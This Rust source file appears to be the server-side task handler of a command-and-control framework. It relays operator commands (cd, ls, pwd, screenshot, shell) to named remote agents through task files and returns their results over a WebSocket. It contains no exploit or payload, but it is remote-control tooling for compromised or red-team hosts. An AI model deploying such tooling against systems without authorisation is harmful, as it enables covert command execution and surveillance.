use axum::extract::ws::{Message, WebSocket};
use log::{error, info, warn};
use std::{
    io::{Error, ErrorKind},
    sync::Arc,
};
use tokio::{
    sync::{Mutex, MutexGuard},
    time::Duration,
};

use crate::{
    server::server::Server,
    utils::fs::{empty_file, read_file, write_file},
};

pub async fn handle_task(
    message_text: String,
    args: Vec<String>,
    socket_lock: &mut MutexGuard<'_, WebSocket>,
    server: Arc<Mutex<Server>>,
) {
    let ag_name = args[1].to_owned(); // The agent name

    let check_sleeptime: Duration = Duration::from_secs(3);
    let max_check_cnt: u8 = 10;

    match args[2].as_str() {
        "cd" => {
            match set_task(&args) {
                Ok(_) => {},
                Err(e) => {
                    let _ = socket_lock.send(
                        Message::Text(
                            format!("[task:error] Could not set the task: {}", e.to_string())
                        )).await;
                    let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                    return;
                }
            }

            check_task_result(
                socket_lock,
                ag_name.to_string(),
                check_sleeptime,
                max_check_cnt,
            ).await;
        }
        "ls" => {
            match set_task(&args) {
                Ok(_) => {},
                Err(e) => {
                    let _ = socket_lock.send(
                        Message::Text(
                            format!("[task:error] Could not set the task: {}", e.to_string())
                        )).await;
                    let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                    return;
                }
            }

            check_task_result(
                socket_lock,
                ag_name.to_string(),
                check_sleeptime,
                max_check_cnt,
            ).await;
        }
        "pwd" => {
            match set_task(&args) {
                Ok(_) => {},
                Err(e) => {
                    let _ = socket_lock.send(
                        Message::Text(
                            format!("[task:error] Could not set the task: {}", e.to_string())
                        )).await;
                    let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                    return;
                }
            }

            check_task_result(
                socket_lock,
                ag_name.to_string(),
                check_sleeptime,
                max_check_cnt,
            ).await;
        }
        "screenshot" => {
            match set_task(&args) {
                Ok(_) => {},
                Err(e) => {
                    let _ = socket_lock.send(
                        Message::Text(
                            format!("[task:error] Could not set the task: {}", e.to_string())
                        )).await;
                    let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                    return;
                }
            }

            check_task_result(
                socket_lock,
                ag_name.to_string(),
                check_sleeptime,
                max_check_cnt,
            ).await;
        }
        "shell" => {
            match set_task(&args) {
                Ok(_) => {},
                Err(e) => {
                    let _ = socket_lock.send(
                        Message::Text(
                            format!("[task:error] Could not set the task: {}", e.to_string())
                        )).await;
                    let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                    return;
                }
            }

            check_task_result(
                socket_lock,
                ag_name.to_string(),
                check_sleeptime,
                max_check_cnt,
            ).await;
        }
        _ => {
            let _ = socket_lock.send(Message::Text(format!("Unknown command: {message_text}"))).await;
            let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
            return;
        }
    }
}

fn set_task(args: &Vec<String>) -> Result<(), Error> {
    let agent_name = args[1].to_string();

    match write_file(
        format!("agents/{}/task/name", agent_name),
        args[2..].join(" ").as_bytes(),
    ) {
        Ok(_) => {
            info!("The task set successfully.");
            return Ok(());
        },
        Err(e) => {
            return Err(Error::new(ErrorKind::Other, e.to_string()));
        },
    }
}

async fn check_task_result(
    socket_lock: &mut MutexGuard<'_, WebSocket>,
    agent_name: String,
    sleeptime: Duration,
    max_check_cnt: u8,
) {
    let mut cnt: u8 = 0;

    loop {
        info!("Getting task result...");
        tokio::time::sleep(sleeptime).await;

        if let Ok(task_result) = read_file(format!("agents/{}/task/result", agent_name.to_string())) {
            if task_result.len() > 0 {
                info!("task result found.");
                let _ = socket_lock.send(Message::Text("[task:shell:ok]".to_owned())).await;
                let _ = socket_lock.send(Message::Binary(task_result)).await;
                let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;

                // Initialize the task result
                empty_file(format!("agents/{}/task/result", agent_name.to_string())).unwrap();
                break;
            } else {
                warn!("task result is empty.");
                cnt += 1;
                if cnt > max_check_cnt {
                    let _ = socket_lock.send(Message::Text("[task:error] Could not get the task result.".to_owned())).await;
                    let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                    break;
                }
            }
        } else {
            error!("Could not read `task/result` file.");
            break;
        }
    }
}